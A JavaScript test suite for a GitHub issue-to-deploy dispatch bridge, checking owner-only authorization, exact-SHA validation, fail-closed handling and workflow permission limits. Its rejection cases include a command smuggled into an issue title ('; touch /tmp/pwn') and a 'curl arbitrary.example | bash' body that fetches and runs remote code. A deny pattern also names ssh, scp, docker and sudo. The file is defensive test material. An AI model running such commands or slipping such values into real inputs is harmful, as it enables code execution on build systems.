import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {
  parseSaboraOwnerReleaseIssue,
  dispatchSaboraOwnerReleaseIssue
} from '../scripts/ci/sabora-owner-issue-dispatch.mjs';
import {assertSaboraReleaseSshBoundary} from '../scripts/ci/sabora-ssh-identity-boundary.mjs';

const MAIN_SHA = 'd83f66a3e3c5331e7906bc5e3976eeddb0ce3bae';
const OLD_SHA = '426960f0c6e645cd21575e0883e8a03638cc9e3a';
const eventFor = (operation = 'plan', sha = MAIN_SHA) => ({
  action: 'opened',
  repository: {full_name: 'jdlc86/CartaViva', default_branch: 'main',
    owner: {login: 'jdlc86'}},
  sender: {login: 'jdlc86'},
  issue: {number: 75, state: 'open', user: {login: 'jdlc86'},
    title: '[sabora] release ' + operation + ' ' + sha, body: ''}
});
const OWNER_CONTEXT = Object.freeze({repository: 'jdlc86/CartaViva', actor: 'jdlc86'});
const clone = value => structuredClone(value);
function fakeGithub({mainSha = MAIN_SHA, failAt = null, liveChange = null, liveIssue = eventFor().issue} = {}) {
  const calls = [];
  const request = (name, data) => {
    calls.push({name, data});
    if (failAt === name) throw new Error('injected_' + name);
    if (name === 'get') {
      const live = clone(liveIssue);
      if (liveChange) liveChange(live);
      return {data: live};
    }
    return {data: name === 'getBranch' ? {commit: {sha: mainSha}} : {}};
  };
  return {calls, rest: {
    repos: {getBranch: data => request('getBranch', data)},
    actions: {createWorkflowDispatch: data => request('createWorkflowDispatch', data)},
    issues: {
      get: data => request('get', data),
      createComment: data => request('createComment', data),
      update: data => request('update', data)
    }
  }};
}

test('Owner Issue bridge: closed command, exact owner and exact Sabora repository', () => {
  const parsed = parseSaboraOwnerReleaseIssue(eventFor('plan'), OWNER_CONTEXT);
  assert.deepEqual(parsed, {
    schema: 'sabora-owner-issue-release-request/v1', issueNumber: 75,
    operation: 'plan', releaseSha: MAIN_SHA,
    repository: 'jdlc86/CartaViva',
    dispatchWorkflow: 'sabora-governed-deploy.yml',
    branch: 'main'
  });
});

test('Sabora issue dispatch calls ONLY exact existing governed workflow, then acknowledges request', async () => {
  for (const operation of ['plan', 'deploy', 'rollback']) {
    const sha = operation === 'rollback' ? OLD_SHA : MAIN_SHA;
    const requestEvent = eventFor(operation, sha);
    const github = fakeGithub({liveIssue:requestEvent.issue});
    const receipt = await dispatchSaboraOwnerReleaseIssue({
      event: requestEvent, context: OWNER_CONTEXT, github
    });
    assert.equal(receipt.dispatchAccepted, true);
    assert.equal(receipt.deploymentValidated, false);
    assert.equal(receipt.controllerUpdated, false);
    assert.deepEqual(github.calls.map(c => c.name), [
      'get', 'getBranch', 'createWorkflowDispatch', 'createComment', 'update'
    ]);
    assert.deepEqual(github.calls[2].data, {
      owner: 'jdlc86', repo: 'CartaViva',
      workflow_id: 'sabora-governed-deploy.yml', ref: 'main',
      inputs: {operation, release_sha: sha}
    });
    const comment = github.calls[3].data.body;
    assert.match(comment, /dispatch acknowledgment only/);
    assert.match(comment, /not deployment/);
    assert.deepEqual(github.calls[4].data, {
      owner: 'jdlc86', repo: 'CartaViva', issue_number: 75, state: 'closed'
    });
  }
});

test('Issue request rejects unauthorized sources, syntax, mutable fields, forbidden actions', async () => {
  const cases = [
    ['edited event', e => {e.action = 'edited';}],
    ['reopened event', e => {e.action = 'reopened';}],
    ['foreign repository', e => {e.repository.full_name = 'jdlc86/GestionIntegral_Rutaa';}],
    ['foreign repository owner', e => {e.repository.owner.login = 'another';}],
    ['other branch', e => {e.repository.default_branch = 'dev';}],
    ['bot sender', e => {e.sender.login = 'github-actions[bot]';}],
    ['other issue author', e => {e.issue.user.login = 'visitor';}],
    ['closed issue', e => {e.issue.state = 'closed';}],
    ['pull request disguised as Issue', e => {e.issue.pull_request = {url:'fake'};}],
    ['zero Issue', e => {e.issue.number = 0;}],
    ['fractional Issue', e => {e.issue.number = 1.5;}],
    ['wrong prefix', e => {e.issue.title = '[automation] production-deploy '+MAIN_SHA;}],
    ['unsupported controller update', e => {e.issue.title = '[sabora] release controller-upgrade '+MAIN_SHA;}],
    ['shell injection title', e => {e.issue.title += '; touch /tmp/pwn';}],
    ['multiline title', e => {e.issue.title += '\nextra';}],
    ['uppercase operation', e => {e.issue.title = '[sabora] release DEPLOY '+MAIN_SHA;}],
    ['short commit', e => {e.issue.title = '[sabora] release deploy '+MAIN_SHA.slice(0,8);}],
    ['body script', e => {e.issue.body = 'run: curl arbitrary.example | bash';}],
    ['body nonempty whitespace + instructions', e => {e.issue.body = ' \n please deploy';}],
    ['body object', e => {e.issue.body = {script:'sh'};}]
  ];
  for (const [name, mutate] of cases) {
    const event = clone(eventFor());
    mutate(event);
    assert.throws(() => parseSaboraOwnerReleaseIssue(event,OWNER_CONTEXT),
      /sabora_issue_dispatch_stop:/, name);
    const github = fakeGithub();
    await assert.rejects(
      dispatchSaboraOwnerReleaseIssue({event,context:OWNER_CONTEXT,github}),
      /sabora_issue_dispatch_stop:/, name);
    assert.equal(github.calls.length,0,'no API calls for '+name);
  }
  for (const [name, context] of [
    ['external actor', {repository:'jdlc86/CartaViva',actor:'other'}],
    ['cross repository context',{repository:'elsewhere/repo',actor:'jdlc86'}]
  ]) {
    assert.throws(() => parseSaboraOwnerReleaseIssue(eventFor(),context),
      /sabora_issue_dispatch_stop:/,name);
  }
});

test('Issue dispatcher fails closed on stale main, missing provider state and partial acknowledgement', async () => {
  const github = fakeGithub({mainSha: OLD_SHA, liveIssue: eventFor('deploy').issue});
  await assert.rejects(
    dispatchSaboraOwnerReleaseIssue({
      event:eventFor('deploy'),context:OWNER_CONTEXT,github
    }), /sabora_issue_dispatch_stop:deploy_not_exact_main/);
  assert.deepEqual(github.calls.map(c=>c.name),['get','getBranch']);
  const invalidSha = fakeGithub({mainSha:'invalid'});
  await assert.rejects(dispatchSaboraOwnerReleaseIssue({
    event:eventFor(),context:OWNER_CONTEXT,github:invalidSha
  }),/sabora_issue_dispatch_stop:untrusted_main_sha/);
  assert.deepEqual(invalidSha.calls.map(c=>c.name),['get','getBranch']);
  const failedDispatch = fakeGithub({failAt:'createWorkflowDispatch'});
  await assert.rejects(dispatchSaboraOwnerReleaseIssue({
    event:eventFor(),context:OWNER_CONTEXT,github:failedDispatch
  }),/injected_createWorkflowDispatch/);
  assert.deepEqual(failedDispatch.calls.map(c=>c.name),
    ['get','getBranch','createWorkflowDispatch']);
  // If comment delivery fails AFTER dispatch, DO NOT claim success or close.
  const failedComment = fakeGithub({failAt:'createComment'});
  await assert.rejects(dispatchSaboraOwnerReleaseIssue({
    event:eventFor(),context:OWNER_CONTEXT,github:failedComment
  }),/injected_createComment/);
  assert.deepEqual(failedComment.calls.map(c=>c.name),
    ['get','getBranch','createWorkflowDispatch','createComment']);
});

test('Live GitHub Issue status is mandatory: owner closure, edit and reassignment revoke dispatch', async () => {
  const cases = [
    ['closed after enqueue', issue => {issue.state = 'closed';}],
    ['title edited after enqueue', issue => {issue.title = '[sabora] release rollback '+OLD_SHA;}],
    ['body edited after enqueue', issue => {issue.body = 'other operation';}],
    ['owner changed', issue => {issue.user.login = 'other';}],
    ['different number', issue => {issue.number = 74;}],
    ['converted to PR', issue => {issue.pull_request = {url: 'bogus'};}],
    ['invalid body type', issue => {issue.body = {action:'deploy'};}]
  ];
  for(const [name,liveChange] of cases) {
    const github=fakeGithub({liveChange});
    await assert.rejects(dispatchSaboraOwnerReleaseIssue({
      event:eventFor(),context:OWNER_CONTEXT,github
    }),/sabora_issue_dispatch_stop:issue_changed_or_closed/,name);
    assert.deepEqual(github.calls.map(c=>c.name),['get'],name);
  }
  const missing=fakeGithub({failAt:'get'});
  await assert.rejects(dispatchSaboraOwnerReleaseIssue({
    event:eventFor(),context:OWNER_CONTEXT,github:missing
  }),/injected_get/);
  assert.deepEqual(missing.calls.map(c=>c.name),['get']);
});

function assertIssueBridgeWorkflowSafety(workflow) {
  assert.match(workflow,/^on:\n  issues:\n    types: \[opened\]/m);
  assert.doesNotMatch(workflow,/^  (push|pull_request|schedule|workflow_dispatch|repository_dispatch):/m);
  assert.match(workflow,/^permissions:\n  contents: read\n  actions: write\n  issues: write/m);
  assert.match(workflow,/github\.repository == 'jdlc86\/CartaViva'/);
  // Both independent issue admission branches MUST retain owner, actor, and
  // safe checkout. One surviving match would miss a broken second branch.
  for (const expr of [
    /github\.repository == 'jdlc86\/CartaViva'/g,
    /github\.actor == github\.repository_owner/g,
    /github\.event\.issue\.user\.login == github\.repository_owner/g,
    /ref: \$\{\{ github\.sha \}\}/g
  ]) assert.equal([...workflow.matchAll(expr)].length,2,'each issue branch independently constrained');
  assert.match(workflow,/github\.actor == github\.repository_owner/);
  assert.match(workflow,/github\.event\.issue\.user\.login == github\.repository_owner/);
  assert.match(workflow,/!github\.event\.issue\.pull_request/);
  assert.match(workflow,/types: \[opened\]/);
  assert.match(workflow,/ref: \$\{\{ github\.sha \}\}/);
  assert.match(workflow,/persist-credentials: false/);
  assert.match(workflow,/\{dispatchSaboraOwnerReleaseIssue\} = await import\(/);
  assert.match(workflow,/await dispatchSaboraOwnerReleaseIssue\(\{/);
  assert.match(workflow,/uses: actions\/github-script@v7/);
  assert.doesNotMatch(workflow,/\bself-hosted\b/);
  // The original owner-Issue admission code must not consume ANY secret.
  // The new declarative reusable-workflow call may pass exactly TWO named
  // Sabora bootstrap transport secrets; never broad inherit or extra code.
  const sections=workflow.split('\n  bootstrap_stage:\n');
  assert.equal(sections.length,2,'one and only one bootstrap stage caller');
  const admission=sections[0].split('\n').filter(s=>!/^\s*#/.test(s)).join('\n');
  assert.doesNotMatch(admission,/\bsecrets\.|\bFLEETIA_|GestionIntegral_Rutaa|\bssh\s|\bscp\s|\bdocker\s|\bsudo\s/i);
  const stage=sections[1].split('\n').filter(s=>!/^\s*#/.test(s)).join('\n').trimEnd();
  assert.equal(stage,[
    '    needs: bootstrap_issue_check',
    '    if: >-',
    "      needs.bootstrap_issue_check.result == 'success' &&",
    "      needs.bootstrap_issue_check.outputs.stage_sha != ''",
    '    uses: ./.github/workflows/sabora-cloud-bootstrap-stage.yml',
    '    with:',
    '      operation: stage',
    '      reviewed_main_sha: ${{ needs.bootstrap_issue_check.outputs.stage_sha }}',
    '    secrets:',
    '      SABORA_BOOTSTRAP_SSH_KEY_B64: ${{ secrets.SABORA_BOOTSTRAP_SSH_KEY_B64 }}',
    '      SABORA_BOOTSTRAP_KNOWN_HOSTS_B64: ${{ secrets.SABORA_BOOTSTRAP_KNOWN_HOSTS_B64 }}'
  ].join('\n'));
  return true;
}

test('Workflow integration preserves authorization in existing release workflow, no new SSH path',()=>{
  const bridge=readFileSync(new URL('../.github/workflows/sabora-owner-issue-deploy-request.yml',import.meta.url),'utf8');
  assert.equal(assertIssueBridgeWorkflowSafety(bridge),true);
  const protectedRelease=readFileSync(new URL('../.github/workflows/sabora-governed-deploy.yml',import.meta.url),'utf8');
  assert.equal(assertSaboraReleaseSshBoundary(protectedRelease).staticContractPass,true);
  const mutations=[
    ['no owner',s=>s.replace('github.event.issue.user.login == github.repository_owner','true')],
    ['no actor',s=>s.replace('github.actor == github.repository_owner','true')],
    ['foreign scope',s=>s.replace("github.repository == 'jdlc86/CartaViva'","github.repository == 'another/repo'")],
    ['push trigger',s=>s.replace('  issues:','  push:\n  issues:')],
    ['broader token',s=>s.replace('  contents: read','  contents: write')],
    ['SSH credential',s=>s.replace('  actions: write','  actions: write\n      SSH_KEY: ${{ secrets.FLEETIA_KEY }}')],
    ['privileged runner',s=>s.replace('runs-on: ubuntu-24.04','runs-on: self-hosted')],
    ['checkout untrusted SHA',s=>s.replace('ref: ${{ github.sha }}','ref: ${{ github.event.issue.title }}')],
    ['no dispatcher',s=>s.replace('dispatchSaboraOwnerReleaseIssue','skipDispatch')],
    ['no named secrets',s=>s.replace('    secrets:', '    secrets: inherit')],
    ['extra secret injection',s=>s.replace(
      '      SABORA_BOOTSTRAP_KNOWN_HOSTS_B64: ${{ secrets.SABORA_BOOTSTRAP_KNOWN_HOSTS_B64 }}',
      '      SABORA_BOOTSTRAP_KNOWN_HOSTS_B64: ${{ secrets.SABORA_BOOTSTRAP_KNOWN_HOSTS_B64 }}\n      FLEETIA_KEY: ${{ secrets.FLEETIA_KEY }}')]
  ];
  for(const [name,mutate] of mutations) {
    const changed=mutate(bridge);
    assert.notEqual(changed,bridge,name);
    assert.throws(()=>assertIssueBridgeWorkflowSafety(changed),undefined,name);
  }
});
